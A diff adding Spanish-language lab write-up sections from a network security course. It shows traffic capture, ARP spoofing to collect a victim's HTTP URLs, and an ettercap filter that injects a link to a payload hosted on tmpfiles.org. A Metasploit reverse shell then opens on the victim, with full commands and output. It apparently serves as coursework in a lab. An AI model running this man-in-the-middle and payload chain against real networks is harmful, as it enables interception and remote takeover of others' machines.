@@ -1041,9 +1041,47 @@ fe80::250:56ff:fe97:6605 dev ens33 lladdr 00:50:56:97:66:05 STALE
 
 Obtenga el tráfico de entrada y salida legítimo de su interface de red `ens33` e investigue los servicios, conexiones y protocolos involucrados.
 
+1. Hacemos un tcpdump para guardar el tráfico capturado en un fichero `my.pcap`:
+
+```bash
+root@debian:/home/lsi# tcpdump -i ens33 -s 65535 -w my.pcap
+tcpdump: listening on ens33, link-type EN10MB (Ethernet), snapshot length 65535 bytes
+^C1250 packets captured
+1254 packets received by filter
+0 packets dropped by kernel
+```
+
+2. Desde nuestra máquina local, hacemos un `scp` para obtener el fichero `my.pcap`:
+
+```zsh
+╭─alvarofreire at alvaro-msi in ~ 22-11-03 - 12:44:17
+╰─○ scp lsi@10.11.48.50:/home/lsi/my.pcap .
+lsi@10.11.48.50's password: 
+my.pcap                                    100%  748KB 401.7KB/s   00:01
+```
+
+3. Ejecutamos Wireshark y abrimos el archivo `my.pcap` para comenzar a analizar.
+
 ### Apartado F
 
 Mediante `arpspoofing` entre una máquina objeto (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.
+
+- Utilizamos el archivo `compa.pcap` obtenido de la máquina de nuestro compañero.
+
+Statistics > HTTP > Requests:
+
+```
+
+================================================================================================================================================
+HTTP/Requests:
+Topic / Item                     Count         Average       Min Val       Max Val       Rate (ms)     Percent       Burst Rate    Burst Start  
+------------------------------------------------------------------------------------------------------------------------------------------------
+HTTP Requests by HTTP Host       3                                                       0,0001        100%          0,0100        21,913       
+ www.hipertexto.info             2                                                       0,0001        66,67%        0,0100        21,913       
+  /documentos/internet_tegn.htm  2                                                       0,0001        100,00%       0,0100        21,913       
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+```
 
 ### Apartado G
 
@@ -1063,16 +1101,223 @@ Final size of elf file: 207 bytes
 2. Lo metemos en la víctima:
 
 ```bash
+root@debian:/home/lsi# cat ett.filter 
+if (ip.proto == TCP && tcp.src == 80) {
+	replace("a href", "a href=\"https://tmpfiles.org/dl/207895/payload.bin\">");
+	msg("replaced href.\n");
+}
+
+root@debian:/home/lsi# etterfilter ett.filter -o ig.ef
+
+etterfilter 0.8.3.1 copyright 2001-2020 Ettercap Development Team
+
+
+ 14 protocol tables loaded:
+	DECODED DATA udp tcp esp gre icmp ipv6 ip arp wifi fddi tr eth 
+
+ 13 constants loaded:
+	VRRP OSPF GRE UDP TCP ESP ICMP6 ICMP PPTP PPPOE IP6 IP ARP 
+
+ Parsing source file 'ett.filter'  done.
+
+ Unfolding the meta-tree  done.
+
+ Converting labels to real offsets  done.
+
+ Writing output to 'ig.ef'  done.
+
+ -> Script encoded into 6 instructions.
+ 
+ root@debian:/home/lsi# echo 1 > /proc/sys/net/ipv4/ip_forward
+ root@debian:/home/lsi# ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.49.106/ //10.11.48.1/
+
+ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team
+
+Content filters loaded from ig.ef...
+Listening on:
+ ens33 -> 00:50:56:97:D5:D9
+	  10.11.48.50/255.255.254.0
+	  fe80::250:56ff:fe97:d5d9/64
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to EUID 65534 EGID 65534...
+
+  34 plugins
+  42 protocol dissectors
+  57 ports monitored
+28230 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Scanning for merged targets (2 hosts)...
+
+* |==================================================>| 100.00 %
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 10.11.49.106 00:50:56:97:24:D0
+
+ GROUP 2 : 10.11.48.1 DC:08:56:10:84:B9
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+replaced href.
+
+replaced href.
+
+replaced href.
+
+replaced href.
+
+replaced href.
+
+Closing text interface...
+
+
+Terminating ettercap...
+Lua cleanup complete!
+ARP poisoner deactivated.
+RE-ARPing the victims...
+Unified sniffing was stopped.
 
 ```
 
 3. Desde el cliente:
 
 ```bash
+root@debian:/home/lsi# curl http://example.org
+<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
 
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://tmpfiles.org/dl/207895/payload.bin">="https://www.iana.org/domains/example">More
 ```
 
+> Vemos que en la última linea la víctima tiene el `payload.bin`.
+
 4. Después de ejecutar el payload obtenemos un reverse shell en el atacante:
+
+```bash
+root@debian:/home/lsi# msfconsole
+                                                  
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com
+
+
+       =[ metasploit v6.2.25-dev-                         ]
++ -- --=[ 2261 exploits - 1188 auxiliary - 402 post       ]
++ -- --=[ 948 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use sessions -1 to interact with the 
+last opened session
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
+payload => linux/x86/shell/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.11.48.50
+LHOST => 10.11.48.50
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.11.48.50:4444 
+[*] Sending stage (36 bytes) to 10.11.49.106
+[*] Command shell session 1 opened (10.11.48.50:4444 -> 10.11.49.106:56054) at 2022-11-03 13:55:42 +0100
+
+
+ls
+Descargas
+Documentos
+Escritorio
+Imágenes
+Música
+Plantillas
+Público
+Vídeos
+etcinitd
+mbox
+ossec-hids-3.7.0
+ossec-hids-3.7.0.zip
+payload.bin
+scripts
+echo h4ck3d > h4ck3d.txt
+cat h4ck3d.txt
+h4ck3d
+exit
+[*] 10.11.49.106 - Command shell session 1 closed.
+msf6 exploit(multi/handler) > exit
+```
 
 ### Apartado H
 
